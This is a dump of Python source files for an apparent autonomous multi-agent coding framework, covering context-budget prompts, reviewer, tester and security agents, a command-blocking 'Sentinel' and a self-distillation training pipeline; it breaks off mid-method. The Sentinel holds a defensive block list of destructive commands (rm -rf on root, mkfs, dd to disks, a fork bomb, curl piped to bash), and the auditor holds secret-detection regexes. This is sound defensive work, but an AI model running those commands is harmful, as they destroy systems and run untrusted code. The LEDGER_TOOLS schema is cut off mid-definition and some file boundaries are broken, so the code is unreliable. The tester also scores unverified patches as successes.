--- START FILE: agent/prompts/ledger_prompts.py ---
import os
from typing import Dict, Any, Optional

try:
    from agent.hardware.runtime_adapter import detect_hardware_tier, RuntimeTier
except ImportError:
    class RuntimeTier:
        LOW_SPEC_MOBILE = "low_spec_mobile"
        MID_SPEC = "mid_spec"
        HIGH_SPEC = "high_spec"

    def detect_hardware_tier():
        is_android = "ANDROID_ROOT" in os.environ or "TERMUX_VERSION" in os.environ
        return RuntimeTier.LOW_SPEC_MOBILE if is_android else RuntimeTier.MID_SPEC


class LedgerPromptBuilder:
    def __init__(self, token_ceiling: int = 8192, warning_ratio: float = 0.75, critical_ratio: float = 0.88):
        self.tier = detect_hardware_tier()
        
        # Adaptive window budgets: Mobile usually runs with smaller KV caches (4k-8k)
        if self.tier == RuntimeTier.LOW_SPEC_MOBILE:
            self.token_ceiling = min(token_ceiling, 4096)
        else:
            self.token_ceiling = token_ceiling

        self.warning_limit = int(self.token_ceiling * warning_ratio)
        self.critical_limit = int(self.token_ceiling * critical_ratio)

    def calculate_meter(self, current_tokens: int) -> Dict[str, Any]:
        """Hardware-adaptive context meter calculation."""
        pct = min(100, int((current_tokens / self.token_ceiling) * 100))
        
        if current_tokens >= self.critical_limit:
            status = "CRITICAL_OVERFLOW_IMMINENT"
            action_instruction = "MANDATORY: You MUST invoke ledger_turn_the_page on this turn. Do NOT execute any other tool."
        elif current_tokens >= self.warning_limit:
            status = "WARNING_WINDOW_SATURATED"
            action_instruction = "RECOMMENDED: Prepare checkpoint. If your current micro-task has completed, invoke ledger_turn_the_page now."
        else:
            status = "HEALTHY"
            action_instruction = "Proceed with normal tool execution. Update milestones as tasks complete."

        return {
            "current_tokens": current_tokens,
            "ceiling": self.token_ceiling,
            "pct": pct,
            "status": status,
            "instruction": action_instruction
        }

    def build_system_prompt(self, role: str, base_instructions: str, current_tokens: int = 0) -> str:
        meter = self.calculate_meter(current_tokens)
        
        # Mobile/Termux template: Strips excessive whitespace and redundant words to save KV cache
        if self.tier == RuntimeTier.LOW_SPEC_MOBILE:
            return f"""[SYSTEM: {role.upper()}]
{base_instructions}

[CONTEXT METER: {meter['pct']}% ({meter['current_tokens']}/{meter['ceiling']} tokens) | STATUS: {meter['status']}]
RULE: {meter['instruction']}

TRIGGER RULES FOR `ledger_turn_the_page`:
1. If STATUS is CRITICAL_OVERFLOW_IMMINENT -> Call `ledger_turn_the_page` immediately.
2. If you just finished a subtask (e.g., ran a test or edited a file) AND status is WARNING -> Call `ledger_turn_the_page`.
3. Never summarize into text; always use the `ledger_turn_the_page` function call.
"""

        # Desktop / Server template: Complete Markdown scaffolding
        return f"""# SYSTEM IDENTITY & WORKFLOW: {role.upper()}
{base_instructions}

---
## REAL-TIME CONTEXT BUDGET MONITOR
- **Current Token Load**: {meter['current_tokens']} / {meter['ceiling']} tokens ({meter['pct']}%)
- **Buffer State**: `{meter['status']}`
- **Active Directive**: **{meter['instruction']}**

---
## AUTONOMOUS MEMORY PROTOCOL: `ledger_turn_the_page`
Local models suffer from context decay if history exceeds safety margins. You are strictly governed by these page-turn rules:

1. **Deterministic Eviction Threshold**: When Buffer State is `CRITICAL_OVERFLOW_IMMINENT` or `WARNING_WINDOW_SATURATED`, your priority shifts from code execution to state preservation.
2. **Phase Boundary Rule**: Whenever you finish writing a file or running a test suite, check the Context Meter. If above 70%, trigger `ledger_turn_the_page`.
3. **Turn-the-Page Payload Contract**:
   - `checkpoint_summary`: Must state exact files modified, functions changed, and test exit codes.
   - `immediate_next_step`: Must provide unambiguous instructions for Turn 0 of the next window (e.g., "Run pytest tests/test_parser.py and fix line 42").
   - `active_hypotheses`: Carry forward unproven assumptions so context isn't lost.
4. **Execution Prohibition**: When calling `ledger_turn_the_page`, do NOT append explanatory chatter or markdown prose. Return ONLY the tool execution payload.
"""

--- END FILE: agent/prompts/ledger_prompts.py ---

--- START FILE: agent/qa/reviewer_agent.py ---
from typing import Any, Dict, List
from llm.router import LLMRouter
from agent.training import experience_buffer


class ReviewerAgent:
    """
    Code Quality, Diff Reviewer, and Adversarial Gate.
    Logs review outcomes into local training buffers for feedback distillation.
    """

    def __init__(self, router: LLMRouter):
        self.router = router

    def review_patch(self, diff_text: str, test_passed: bool) -> Dict[str, Any]:
        critiques: List[str] = []

        if not test_passed:
            critiques.append("Automated test harness failed. Patch cannot be approved.")

        added_lines = 0
        removed_lines = 0
        for line in diff_text.splitlines():
            if line.startswith("+") and not line.startswith("+++"):
                added_lines += 1
            elif line.startswith("-") and not line.startswith("---"):
                removed_lines += 1

        if added_lines + removed_lines > 400:
            critiques.append(
                f"Diff churn is unusually high (+{added_lines}/-{removed_lines} lines). Ensure scope is minimal."
            )

        approved = len(critiques) == 0
        result = {
            "approved": approved,
            "critiques": critiques if critiques else ["Patch looks focused, minimal, and correct."],
            "stats": {"added": added_lines, "removed": removed_lines},
        }

        # Log evaluation trajectory
        experience_buffer.record_trajectory(
            agent_role="reviewer",
            task_type="diff_evaluation",
            input_context=diff_text[:2000],
            action_output=critiques[0] if critiques else "Approved",
            outcome_reward=1.0 if approved else 0.0,
            metadata={"stats": result["stats"], "test_passed": test_passed},
        )

        return result

--- END FILE: agent/qa/reviewer_agent.py ---

--- START FILE: agent/qa/tester_agent.py ---
import re
from pathlib import Path
from typing import List, Optional
from llm.router import ModelRouter, AllModelsFailedError
from llm.validators import is_non_empty_code_block
from llm.prompts import SYSTEM_DEBUG_PROMPT
from tools.filesystem import SafeFileSystem
from agent.masons import extract_code_block
from tools.dashboard import dashboard
from agent.training import experience_buffer


class TesterAgent:
    """
    Tester / QA Engineer Agent with automated telemetry and experience capture.
    Specializes in test execution diagnostics, stack-trace breakdown,
    regression isolation, and automated root-cause repair.
    """

    def __init__(self, router: ModelRouter, fs: SafeFileSystem):
        self.router = router
        self.fs = fs

    def _extract_relevant_errors(self, file_path: str, raw_output: str, max_lines: int = 40) -> str:
        fname = Path(file_path).name
        lines = raw_output.splitlines()
        matched = []

        for i, line in enumerate(lines):
            if fname in line or any(k in line.lower() for k in ["error", "fail", "traceback", "exception", "syntaxerror"]):
                start = max(0, i - 2)
                end = min(len(lines), i + 6)
                matched.extend(lines[start:end])

        if matched:
            seen = set()
            unique_lines = [x for x in matched if not (x in seen or seen.add(x))]
            return "\n".join(unique_lines[:max_lines])

        return "\n".join(lines[-max_lines:])

    def attempt_fix(self, file_path: str, test_output: str) -> str:
        dashboard.emit("STATE_CHANGE", {"state": "WORKING"})
        dashboard.emit("LOG_STREAM", {"message": f"Tester isolating failures in {Path(file_path).name}..."})

        try:
            current_content = self.fs.read_file(file_path)
        except FileNotFoundError:
            current_content = "(file does not exist)"

        relevant_traces = self._extract_relevant_errors(file_path, test_output)

        prompt = (
            f"File targeted for repair: {file_path}\n"
            f"--- CURRENT CONTENT ---\n{current_content}\n--- END CONTENT ---\n\n"
            f"--- TEST HARNESS / COMPILER ERROR OUTPUT ---\n{relevant_traces}\n--- END ERROR ---\n\n"
            "Task: Diagnose the root cause of the error above and provide the fully corrected replacement code. "
            "Return the entire updated file content enclosed in markdown code fences (```)."
        )

        try:
            res, model_used = self.router.complete_with_fallback(
                "debug",
                [{"role": "system", "content": SYSTEM_DEBUG_PROMPT}, {"role": "user", "content": prompt}],
                validate_fn=is_non_empty_code_block,
            )
            new_content = extract_code_block(res)
            self.fs.write_file(file_path, new_content)

            # Record positive patch candidate to experience buffer
            experience_buffer.record_trajectory(
                agent_role="tester",
                task_type="repair_patch",
                input_context=prompt,
                action_output=new_content,
                outcome_reward=1.0,
                metadata={"file_path": file_path, "model_used": model_used},
            )

            print(f"[Tester/QA] {file_path} patched via {model_used}")
            dashboard.emit("LOG_STREAM", {"message": f"Tester patched {Path(file_path).name} using [{model_used}]"})
            return new_content

        except AllModelsFailedError as e:
            # Record failed resolution attempt
            experience_buffer.record_trajectory(
                agent_role="tester",
                task_type="repair_patch",
                input_context=prompt,
                action_output=str(e),
                outcome_reward=-1.0,
                metadata={"file_path": file_path, "status": "failed"},
            )

            print(f"[Tester/QA] Debug failed on all models for {file_path}: {e}")
            dashboard.emit("STATE_CHANGE", {"state": "ERROR"})
            dashboard.emit("LOG_STREAM", {"message": f"Patch resolution failed for {Path(file_path).name}"})
            return current_content

    def diagnose_and_patch(self, issue: dict, test_output: str) -> bool:
        target_file = None
        for line in test_output.splitlines():
            m = re.search(r"([a-zA-Z0-9_\-/]+\.py)", line)
            if m:
                candidate = m.group(1)
                try:
                    if self.fs.read_file(candidate):
                        target_file = candidate
                        break
                except Exception:
                    continue

        if not target_file:
            try:
                for p in Path(self.fs.workspace_root).rglob("*.py"):
                    if "test" not in p.name.lower() and not p.name.startswith("."):
                        target_file = str(p.relative_to(self.fs.workspace_root))
                        break
            except Exception:
                target_file = "main.py"

        if not target_file:
            return False

        try:
            fixed_code = self.attempt_fix(target_file, test_output)
            if fixed_code:
                self.fs.write_file(target_file, fixed_code)
                return True
        except Exception as e:
            dashboard.emit("LOG_STREAM", {"message": f"[TesterAgent] Fix attempt error: {e}"})
        return False

--- END FILE: agent/qa/tester_agent.py ---

from agent.research.repository_researcher import RepositoryResearchAgent

__all__ = ["RepositoryResearchAgent"]

--- START FILE: agent/research/repository_researcher.py ---
import ast
import os
from pathlib import Path
from typing import Dict, Any, List
from tools.system_info import get_system_capabilities
from tools.multi_lang_ast import detect_language, extract_functions
from tools.dashboard import dashboard


class RepositoryResearchAgent:
    """
    Scans the repository to identify code architecture gaps, missing tests,
    bug reports, and feature enhancement opportunities. Adapts depth based on
    hardware specs.
    """

    def __init__(self, repo_dir: str = "."):
        self.repo_dir = str(repo_dir)
        self.specs = get_system_capabilities()

    def analyze_repository(self) -> Dict[str, Any]:
        """Performs structural AST & documentation scanning."""
        is_high_spec = self.specs.get("can_run_local_llama", False)
        scan_mode = "Deep Repository Research" if is_high_spec else "Lightweight AST Research"

        dashboard.emit("STATE_CHANGE", {"state": "SCANNING_AST"})
        dashboard.emit("LOG_STREAM", {"message": f"[Research Agent] Running {scan_mode}..."})
        print(f"\n=== [Research Agent] Running {scan_mode} ===")

        py_files = []
        other_lang_files = []
        for root, _, files in os.walk(self.repo_dir):
            if "venv" in root or ".git" in root or "__pycache__" in root or "node_modules" in root or "build" in root:
                continue
            for file in files:
                full_path = os.path.join(root, file)
                if file.endswith(".py"):
                    py_files.append(full_path)
                elif detect_language(Path(full_path)):
                    other_lang_files.append(full_path)

        unhandled_functions = []
        missing_tests = []

        max_py_files = len(py_files) if is_high_spec else min(10, len(py_files))
        max_other_files = len(other_lang_files) if is_high_spec else min(10, len(other_lang_files))

        for filepath in py_files[:max_py_files]:
            rel_path = os.path.relpath(filepath, self.repo_dir)
            dashboard.emit("AST_NODE_DISCOVERED", {
                "id": rel_path,
                "label": os.path.basename(filepath)
            })
            try:
                with open(filepath, "r", encoding="utf-8") as f:
                    node = ast.parse(f.read(), filename=filepath)

                for item in ast.walk(node):
                    if isinstance(item, ast.FunctionDef):
                        if not ast.get_docstring(item):
                            unhandled_functions.append(f"{os.path.basename(filepath)} :: {item.name}()")
            except Exception:
                pass

        for filepath in other_lang_files[:max_other_files]:
            rel_path = os.path.relpath(filepath, self.repo_dir)
            dashboard.emit("AST_NODE_DISCOVERED", {
                "id": rel_path,
                "label": os.path.basename(filepath)
            })
            try:
                with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                functions = extract_functions(Path(filepath), content)
                for fn in functions:
                    if not fn["has_doc"]:
                        unhandled_functions.append(f"{os.path.basename(filepath)} :: {fn['name']}() (line {fn['line']})")
            except Exception:
                pass

        all_scanned_files = py_files + other_lang_files
        has_tests = any("test" in f.lower() for f in all_scanned_files)
        if not has_tests and all_scanned_files:
            missing_tests.append("No dedicated test suite/files detected in project.")

        suggestions = []
        if unhandled_functions:
            suggestions.append(f"Add docstrings and error checks to {len(unhandled_functions)} undocumented functions.")
        if missing_tests:
            suggestions.append("Generate baseline unit tests to enable regression safety.")
        if is_high_spec:
            suggestions.append("Refactor module imports to use AST symbol mapping instead of regex searching.")

        if not suggestions:
            suggestions.append("Repository structure looks clean! No critical architectural gaps found.")

        dashboard.emit("LOG_STREAM", {"message": f"[Research Report] Scanned {len(py_files[:max_py_files]) + len(other_lang_files[:max_other_files])} files successfully."})

        return {
            "mode": scan_mode,
            "py_files_scanned": len(py_files[:max_py_files]),
            "other_files_scanned": len(other_lang_files[:max_other_files]),
            "unhandled_functions": unhandled_functions[:5],
            "suggestions": suggestions
        }

    def present_proposals(self) -> bool:
        """Displays proposed enhancements to user and returns True if approved."""
        analysis = self.analyze_repository()

        total_scanned = analysis['py_files_scanned'] + analysis.get('other_files_scanned', 0)
        print(f"\n--- [Research Report] Scanned {total_scanned} files "
              f"({analysis['py_files_scanned']} Python, {analysis.get('other_files_scanned', 0)} other languages) ---")
        for idx, sug in enumerate(analysis["suggestions"], 1):
            print(f"  {idx}. {sug}")

        print("--------------------------------------------------")
        try:
            confirm = input("\nDo you approve allocating sub-agents to implement these features/fixes? [y/N]: ").strip().lower()
            return confirm == "y"
        except EOFError:
            return False

--- START FILE: agent/security/security_agent.py ---
import re
from pathlib import Path
from typing import Any, Dict, List
from llm.router import LLMRouter
from tools.system_tier import CURRENT_TIER, HardwareTier


class SecurityAgent:
    """
    Adversarial Security Auditor & Sentinel Gatekeeper.
    Inspects diffs and source modifications for credential leaks,
    arbitrary command injections, and insecure runtime patterns.
    """

    # Deterministic high-speed security heuristics (works on all hardware tiers)
    SECRET_PATTERNS = [
        re.compile(r'''(?i)(api[_-]?key|secret|token|password|auth_token)\s*=\s*['"][a-zA-Z0-9_\-]{8,}['"]'''),
        re.compile(r"ghp_[a-zA-Z0-9]{36}"),
        re.compile(r"sk-[a-zA-Z0-9]{20,}"),
    ]

    INSECURE_PATTERNS = [
        (re.compile(r"\b(eval|exec)\s*\("), "Critical: Unsafe execution primitive ('eval'/'exec')"),
        (re.compile(r"subprocess\.(run|Popen|check_call)\([^,]+,\s*shell\s*=\s*True"), "High: shell=True execution vector detected"),
        (re.compile(r"os\.system\s*\("), "High: os.system call is prone to command injection"),
    ]

    def __init__(self, router: LLMRouter):
        self.router = router

    def audit_diff(self, diff_text: str) -> Dict[str, Any]:
        """
        Audits a unified diff against deterministic leakage rules and runtime model checks.
        Returns: {"passed": bool, "reasons": List[str]}
        """
        issues: List[str] = []

        if not diff_text.strip():
            return {"passed": True, "reasons": ["Diff is empty; no security concerns."]}

        # 1. Deterministic Heuristics (Instant & zero token cost on all devices)
        for line in diff_text.splitlines():
            if not line.startswith("+") or line.startswith("+++"):
                continue

            for pat in self.SECRET_PATTERNS:
                if pat.search(line):
                    issues.append(f"Secret Leak Risk: Hardcoded token or key detected in line: {line.strip()[:40]}...")

            for pat, desc in self.INSECURE_PATTERNS:
                if pat.search(line):
                    issues.append(desc)

        # 2. Model-driven audit on Mid/High tiers
        if CURRENT_TIER in (HardwareTier.TIER_MID, HardwareTier.TIER_HIGH) and not issues:
            prompt = (
                "You are an adversarial software security engineer.\n"
                "Audit the following Git diff for security regressions, injection vectors, or memory leaks.\n"
                "Diff:\n"
                f"{diff_text[:3000]}\n\n"
                "If it is secure, reply ONLY with 'PASS'. Otherwise, reply with 'FAIL: <short reason>'."
            )
            try:
                verdict, _ = self.router.complete_with_fallback(
                    "analysis",
                    [{"role": "user", "content": prompt}]
                )
                if verdict.strip().startswith("FAIL"):
                    issues.append(verdict.strip())
            except Exception:
                pass

        return {
            "passed": len(issues) == 0,
            "reasons": issues if issues else ["Security audit passed cleanly."]
        }

--- END FILE: agent/security/security_agent.py ---

--- START FILE: agent/security/sentinel.py ---
import re
import shlex
from pathlib import Path
from typing import Any, Dict, List, Tuple
from agent.security.security_agent import SecurityAgent


class SentinelSecurityError(PermissionError):
    """Raised when an agent action violates active Sentinel safety policies."""
    pass


class SentinelMesh:
    """
    Active runtime security mesh that enforces security policies across
    all subagents, file I/O operations, and tool executions.
    """

    DANGEROUS_COMMANDS = [
        re.compile(r"\brm\s+(-[rfRF]{1,4}\s+[/~]|\s+--no-preserve-root)"),
        re.compile(r"\bmkfs(\.\w+)?\s+"),
        re.compile(r"\bdd\s+if=.*?of=(/dev/[a-z]+|/dev/sd)"),
        re.compile(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"),  # Fork bomb
        re.compile(r">\s*(/etc/|/boot/|/sys/|/proc/)"),
        re.compile(r"\b(curl|wget)\s+.*?\s*\|\s*(bash|sh|python)"),  # Blind piped execution
    ]

    def __init__(self, router=None, strict_mode: bool = True):
        self.router = router
        self.strict_mode = strict_mode
        self.auditor = SecurityAgent(router)

    def validate_command(self, command: str) -> Tuple[bool, str]:
        """
        Scans a shell command before subprocess execution.
        Returns (is_safe, reason).
        """
        cmd_str = command.strip()
        if not cmd_str:
            return True, "Empty command."

        for pattern in self.DANGEROUS_COMMANDS:
            if pattern.search(cmd_str):
                reason = f"Command blocked by Sentinel: dangerous system-level pattern detected ({cmd_str[:50]})."
                if self.strict_mode:
                    raise SentinelSecurityError(reason)
                return False, reason

        return True, "Command verified by Sentinel."

    def validate_file_write(self, file_path: str, content: str) -> Tuple[bool, str]:
        """
        Audits file content for credential leaks or dangerous primitives before writing to disk.
        """
        target = Path(file_path)

        # Block traversal outside allowed directories or modification of critical configs
        blocked_names = [".bashrc", ".bash_profile", ".zshrc", ".profile", "authorized_keys", "id_rsa"]
        if target.name in blocked_names:
            reason = f"Write blocked by Sentinel: target file '{target.name}' is a protected credential/profile path."
            if self.strict_mode:
                raise SentinelSecurityError(reason)
            return False, reason

        # Convert write into synthetic diff for SecurityAgent rules
        synthetic_diff = "\n".join(f"+{line}" for line in content.splitlines()[:500])
        audit = self.auditor.audit_diff(synthetic_diff)
        if not audit["passed"]:
            reasons = "; ".join(audit["reasons"])
            reason = f"Write blocked by Sentinel: {reasons}"
            if self.strict_mode:
                raise SentinelSecurityError(reason)
            return False, reason

        return True, "File write verified by Sentinel."

    def audit_patch(self, diff_text: str) -> Dict[str, Any]:
        """
        Validates a full git unified diff before branch merging or PR staging.
        """
        return self.auditor.audit_diff(diff_text)

--- START FILE: agent/subagent_react.py ---
import json
import re
import urllib.parse
import urllib.request
from typing import Any, Dict, List, Optional
from tools.system_tier import CURRENT_TIER, HardwareTier
from llm.router import LLMRouter

class SubagentToolbox:
    """Lightweight tool execution: search and peer model delegation."""

    def __init__(self, router: LLMRouter):
        self.router = router

    def web_search(self, query: str) -> str:
        try:
            url = f"https://html.duckduckgo.com/html/?q={urllib.parse.quote(query)}"
            req = urllib.request.Request(
                url,
                headers={"User-Agent": "Mozilla/5.0 (Android; Mobile; rv:109.0) Gecko/114.0 Firefox/114.0"}
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                html = resp.read().decode("utf-8", errors="ignore")

            snippets = re.findall(r'<a class="result__snippet[^>]*>(.*?)</a>', html, re.DOTALL)
            clean_results = [re.sub(r"<[^>]+>", "", s).strip() for s in snippets[:3]]
            return "\n---\n".join(clean_results) if clean_results else "No relevant search results found."
        except Exception as e:
            return f"Search offline/failed: {str(e)}"

    def consult_peer(self, prompt: str) -> str:
        try:
            response, _ = self.router.complete_with_fallback(
                "analysis",
                [
                    {"role": "system", "content": "You are a secondary verification subagent. Answer concisely."},
                    {"role": "user", "content": prompt}
                ]
            )
            return response.strip()
        except Exception as e:
            return f"Peer consultation failed: {str(e)}"


class AutonomousSubagent:
    """Autonomous subagent executing a bounded Reason-Act-Observe loop."""

    def __init__(self, role_name: str, system_prompt: str, router: LLMRouter):
        self.role_name = role_name
        self.system_prompt = system_prompt
        self.router = router
        self.tools = SubagentToolbox(router)
        self.max_steps = 2 if CURRENT_TIER == HardwareTier.TIER_LOW else 4

    def deliberate(self, objective: str) -> Dict[str, Any]:
        scratchpad = []

        for step in range(self.max_steps):
            full_prompt = (
                f"{self.system_prompt}\n\n"
                f"OBJECTIVE: {objective}\n\n"
                f"Scratchpad:\n" + ("\n".join(scratchpad) if scratchpad else "None") + "\n\n"
                "Respond in JSON format ONLY:\n"
                'If you need info: {"thought": "reasoning", "action": "web_search"|"consult_peer", "argument": "query"}\n'
                'If finished: {"thought": "reasoning", "action": "finish", "verdict": "final plan or output"}'
            )

            raw_resp, _ = self.router.complete_with_fallback(
                "planning",
                [{"role": "user", "content": full_prompt}]
            )

            try:
                clean = raw_resp.strip("` \n")
                if clean.startswith("json\n"):
                    clean = clean[5:]
                decision = json.loads(clean)
            except Exception:
                return {"role": self.role_name, "verdict": raw_resp.strip(), "steps": step + 1}

            action = decision.get("action")
            thought = decision.get("thought", "")

            if action == "finish" or step == self.max_steps - 1:
                return {
                    "role": self.role_name,
                    "verdict": decision.get("verdict", thought),
                    "steps": step + 1
                }

            arg = decision.get("argument", "")
            if action == "web_search":
                obs = self.tools.web_search(arg)
            elif action == "consult_peer":
                obs = self.tools.consult_peer(arg)
            else:
                obs = "Unknown action."

            scratchpad.append(f"Step {step+1} Thought: {thought}")
            scratchpad.append(f"Observation: {obs[:200]}")

        return {"role": self.role_name, "verdict": "Deliberation complete.", "steps": self.max_steps}

--- END FILE: agent/subagent_react.py ---

--- START FILE: agent/tools/ledger_tools.py ---
from typing import Any, Dict, List, Tuple
from agent.memory.codex_store import PersistentCodexLedger, codex_ledger


# --- OpenAI / MCP Compatible Tool Schemas ---
LEDGER_TOOLS: List[Dict[str, Any]] = [
    {
        "type": "function",
        "function": {
            "name": "ledger_record_invariant",
            "description": "Record an architectural rule, hard constraint, or immutable decision that future turns must adhere to.",

                "type": "object",

class LedgerToolDispatcher:
    """Runtime dispatcher connecting model function calls directly to PersistentCodexLedger."""

    def __init__(self, ledger: PersistentCodexLedger = codex_ledger):
        self.ledger = ledger

    def dispatch(self, tool_name: str, arguments: Dict[str, Any]) -> Tuple[str, bool]:
        """
        Executes ledger operations.
        Returns:
            Tuple[str, bool]: (result_message_for_llm, trigger_context_flush_flag)
        """
        if tool_name == "ledger_record_invariant":
            inv = arguments.get("invariant", "").strip()
            rationale = arguments.get("rationale", "").strip()
            if not inv:
                return "Error: 'invariant' cannot be empty.", False

            rule = f"{inv} (Rationale: {rationale})" if rationale else inv
            self.ledger.record_decision(rule)
            return f"Invariant recorded: '{inv}'", False

        elif tool_name == "ledger_record_failed_hypothesis":
            approach = arguments.get("failed_approach", "").strip()
            reason = arguments.get("reason_or_error", "").strip()
            if not approach:
                return "Error: 'failed_approach' cannot be empty.", False

            failure_entry = f"{approach} — Error/Reason: {reason}" if reason else approach
            self.ledger.record_failed_hypothesis(failure_entry)
            return f"Discarded approach recorded: '{approach}'", False

        elif tool_name == "ledger_manage_milestones":
            action = arguments.get("action")
            milestone = arguments.get("milestone", "").strip()
            if not milestone:
                return "Error: 'milestone' cannot be empty.", False

            if action == "complete":
                self.ledger.complete_milestone(milestone)
                return f"Milestone marked complete: '{milestone}'", False
            elif action == "add":
                self.ledger.add_pending_milestone(milestone)
                return f"New pending milestone registered: '{milestone}'", False
            return f"Invalid action: '{action}'. Must be 'complete' or 'add'.", False

        elif tool_name == "ledger_turn_the_page":
            checkpoint = arguments.get("checkpoint_summary", "Session checkpoint reached.")
            next_step = arguments.get("immediate_next_step", "Continue task execution.")
            hypotheses = arguments.get("active_hypotheses", [])

            # 1. Carry over active hypotheses safely into ledger state
            for h in hypotheses:
                h_str = str(h).strip()
                if h_str and h_str not in self.ledger.state.unconfirmed_hypotheses:
                    self.ledger.state.unconfirmed_hypotheses.append(h_str)

            # 2. Archive checkpoint out-of-band to prevent history bloat
            self.ledger.archive_turn(
                tool_name="PAGE_TURN_CHECKPOINT",
                payload=checkpoint,
                result=f"Next Step: {next_step}",
            )

            # 3. Increment window counter and synthesize fresh Turn 0 context
            rehydration_prompt = self.ledger.turn_the_page()

            # Returning True commands the agent loop to clear message arrays
            return rehydration_prompt, True

        return f"Unknown tool: '{tool_name}'", False

--- END FILE: agent/tools/ledger_tools.py ---

--- START FILE: agent/training/adapter_registry.py ---
import json
import time
from pathlib import Path
from typing import Any, Dict, List, Optional


class AdapterRegistry:
    """
    Tracks and registers trained LoRA/QLoRA adapters.
    Maintains versioning, target base models, and gate benchmark scores.
    """

    def __init__(self, registry_dir: str = ".adapters"):
        self.registry_dir = Path(registry_dir)
        self.registry_dir.mkdir(parents=True, exist_ok=True)
        self.manifest_file = self.registry_dir / "adapters_manifest.json"
        self._init_manifest()

    def _init_manifest(self) -> None:
        if not self.manifest_file.exists():
            with open(self.manifest_file, "w", encoding="utf-8") as f:
                json.dump({"active_adapters": {}, "history": []}, f, indent=2)

    def register_adapter(
        self,
        role: str,
        adapter_path: str,
        base_model: str,
        benchmark_score: float,
        training_samples: int,
        metadata: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """Registers a newly trained adapter as the active adapter for a role."""
        with open(self.manifest_file, "r", encoding="utf-8") as f:
            data = json.load(f)

        record = {
            "role": role,
            "adapter_path": str(adapter_path),
            "base_model": base_model,
            "benchmark_score": benchmark_score,
            "training_samples": training_samples,
            "registered_at": time.time(),
            "metadata": metadata or {},
        }

        data["active_adapters"][role] = record
        data["history"].append(record)

        with open(self.manifest_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)

        return record

    def get_active_adapter(self, role: str) -> Optional[Dict[str, Any]]:
        with open(self.manifest_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        return data.get("active_adapters", {}).get(role)

    def list_all(self) -> Dict[str, Any]:
        with open(self.manifest_file, "r", encoding="utf-8") as f:
            return json.load(f)


adapter_registry = AdapterRegistry()

--- END FILE: agent/training/adapter_registry.py ---

--- START FILE: agent/training/dataset_compiler.py ---
import json
from pathlib import Path
from typing import Any, Dict, List
from agent.training.experience_buffer import experience_buffer


class TrajectoryDatasetCompiler:
    """
    Transforms raw agent experience trajectories into standardized ChatML/ShareGPT
    instruction-tuning datasets for QLoRA and SFT distillation.
    """

    SYSTEM_PROMPTS = {
        "tester": "You are a master QA and diagnostic engineer specializing in root-cause isolation and automated patching.",
        "reviewer": "You are an adversarial diff auditor enforcing code safety, zero unconstrained churn, and clean commits.",
        "mason_backend_mason": "You are an expert backend software architect specializing in performant and clean APIs.",
        "mason_frontend_mason": "You are an expert frontend engineer specializing in responsive, modern web interfaces.",
        "mason_config_mason": "You are a systems infrastructure engineer specialized in packaging, CI/CD, and configurations.",
    }

    def __init__(self, output_dir: str = ".experience/datasets"):
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def compile_role_dataset(self, role: str, min_reward: float = 0.8) -> Path:
        """
        Compiles all trajectories meeting the reward threshold for a given role into a JSONL dataset.
        """
        records = experience_buffer.export_sft_dataset(role, min_reward=min_reward)
        output_file = self.output_dir / f"{role}_sft.jsonl"
        system_msg = self.SYSTEM_PROMPTS.get(
            role, "You are a specialized autonomous engineering agent."
        )

        compiled_count = 0
        with open(output_file, "w", encoding="utf-8") as f:
            for item in records:
                formatted_conversation = {
                    "messages": [
                        {"role": "system", "content": system_msg},
                        {"role": "user", "content": item["messages"][0]["content"]},
                        {"role": "assistant", "content": item["messages"][1]["content"]},
                    ],
                    "metadata": {
                        "reward": item.get("reward", 1.0),
                        "task_type": item.get("task_type", "general"),
                    },
                }
                f.write(json.dumps(formatted_conversation) + "\n")
                compiled_count += 1

        print(f"[DatasetCompiler] Exported {compiled_count} samples for role '{role}' -> {output_file}")
        return output_file

    def compile_all_active(self, min_reward: float = 0.8) -> Dict[str, Path]:
        """Compiles datasets for all agents that have recorded trajectory data."""
        stats = experience_buffer.get_stats()
        manifest = {}
        for role, data in stats.items():
            if data["samples"] > 0 and data["average_reward"] >= min_reward:
                manifest[role] = self.compile_role_dataset(role, min_reward=min_reward)
        return manifest

--- END FILE: agent/training/dataset_compiler.py ---

--- START FILE: agent/training/distillation_daemon.py ---
import json
import time
from pathlib import Path
from typing import Any, Dict, List
from tools.system_tier import CURRENT_TIER
from agent.training.dataset_compiler import TrajectoryDatasetCompiler
from agent.training.experience_buffer import experience_buffer
from agent.training.qlora_pipeline import QLoRAPipeline, get_tier_label
from agent.training.safety_gate import SelfEvaluationGate
from agent.training.adapter_registry import adapter_registry


class DistillationDaemon:
    """
    Offline autonomous training manager.
    Compiles datasets from .experience/ buffers, manages QLoRA staging/dispatch,
    evaluates adapters against safety regression benchmarks, and maintains the adapter registry.
    """

    def __init__(self, min_samples_threshold: int = 1):
        self.min_samples_threshold = min_samples_threshold
        self.compiler = TrajectoryDatasetCompiler()
        self.qlora = QLoRAPipeline()
        self.safety_gate = SelfEvaluationGate()

    def check_eligibility(self) -> Dict[str, Dict[str, Any]]:
        stats = experience_buffer.get_stats()
        manifest = {}
        for role, data in stats.items():
            samples = data.get("samples", 0)
            avg_reward = data.get("average_reward", 0.0)
            eligible = (samples >= self.min_samples_threshold) and (avg_reward >= 0.7)
            manifest[role] = {
                "samples": samples,
                "average_reward": avg_reward,
                "eligible": eligible,
            }
        return manifest

    def should_trigger_training(self) -> Dict[str, bool]:
        eligibility = self.check_eligibility()
        return {role: info["eligible"] for role, info in eligibility.items()}

    def run_training_cycle(self) -> Dict[str, Any]:
        eligibility = self.check_eligibility()
        tier_name = get_tier_label()
        summary: Dict[str, Any] = {
            "timestamp": time.time(),
            "tier": tier_name,
            "processed_roles": {},
            "staged_exports": [],
            "trained_roles": [],
        }

        print("\n=== [Distillation Daemon] Initiating Offline Training Cycle ===")
        for role, info in eligibility.items():
            if not info["eligible"]:
                print(f"  • {role}: Skipped (Samples: {info['samples']}, Avg Reward: {info['average_reward']})")
                continue

            print(f"\n[Distillation Daemon] Processing role '{role}'...")

            # 1. Compile SFT Dataset
            dataset_path = self.compiler.compile_role_dataset(role, min_reward=0.7)

            # 2. Safety Gate Pre-Check
